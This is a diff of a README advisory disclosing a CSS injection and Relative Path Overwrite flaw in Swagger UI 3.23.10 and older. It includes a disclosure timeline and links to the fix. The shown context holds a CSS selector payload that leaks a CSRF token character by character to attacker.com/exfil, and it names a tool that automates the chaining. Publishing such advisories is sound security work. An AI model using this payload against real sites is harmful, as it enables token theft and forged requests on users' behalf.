@@ -1,6 +1,6 @@
 # CSS-injection-in-Swagger-UI
 
-We have found a CSS Injection vulnerability on Swagger UI that allows attacker to use the Relative Path Overwrite (RPO) [2][3]technique to perform CSS-based input field value exfiltration. In our PoC, we were able to successfully steal the value of the CSRF token.
+We have found a CSS Injection vulnerability on Swagger UI that allows attacker to use the Relative Path Overwrite (RPO) [2][3] technique to perform CSS-based input field value exfiltration. In our PoC, we were able to successfully steal the value of the CSRF token.
 
 **Researcher: Kevin (DatLP) of The Tarantula Team, VinCSS (a member of Vingroup)**
 
@@ -40,7 +40,7 @@ This means we can inject json via the GET parameter. In the json content we use 
     
 ### Exfiltration step:
 
-With CSS payload, we can use Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration [4]. The following CSS code will generate a callback query to the attacker's server (https://attacker.com/exfil/a) if the CSRF token value starts with the character a, similarly it will make other requests (https://attacker.com/exfil/b; (https://attacker.com/exfil/c; https://attacker.com/exfil/d, etc) if the CSRF token value begins with character b, character c or character d:
+With CSS payload, we can use Relative Path Overwrite (RPO) technique to perform CSS-based input field value exfiltration [4]. The following CSS code will generate a callback query to the attacker's server (https://attacker.com/exfil/a) if the CSRF token value starts with the character a, similarly it will make other requests (https://attacker.com/exfil/b; https://attacker.com/exfil/c; https://attacker.com/exfil/d, etc) if the CSRF token value begins with character b, character c or character d:
 
 ```css
 input[name=csrf][value^=a]{
@@ -69,16 +69,25 @@ input[name=csrf][value^=a9]{
 
 With sequential @import chaining as below so we can steal full of CSRF token value:
 
-![](sequential import chaining.png)
+![](sequential%20import%20chaining.png)
 
 You can automate all this by using the [sic](https://github.com/d0nutptr/sic) tool [6]
 
+And result:
+
+![](PoC-RPO-2.png)
+
     
 ## Tested versions
+
 Swagger UI v3.23.10 and older versions
 
 ## Disclosure timeline
 
+- September 17, 2019: Report and discuss with maintainer for Swagger UI.
+- September 20, 2019: Ask maintainer for disclosure vulnerability.
+- September 21, 2019: Swagger UI has released a new version that has addressed the vulnerability.
+- September 21, 2019: Get approval from maintainer for disclosure on October 6, 2019.
 
 
 ## Reference
@@ -93,5 +102,7 @@ Swagger UI v3.23.10 and older versions
 8. [2019‐s3_css_injection_attacks.pdf](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf)
 9. [RPO Gadgets](https://blog.innerht.ml/rpo-gadgets/)
 10. [add an `enableQueryConfig` option issue #4872](https://github.com/swagger-api/swagger-ui/issues/4872)
+11. [mitigate "sequential @import chaining" vulnerability issue #5616 ](https://github.com/swagger-api/swagger-ui/pull/5616)
+12. [Swagger UI 3.23.11 Released! This release contains a security fix that addresses a CSS-based input field value exfiltration vulnerability](https://github.com/swagger-api/swagger-ui/releases/tag/v3.23.11)
 
 
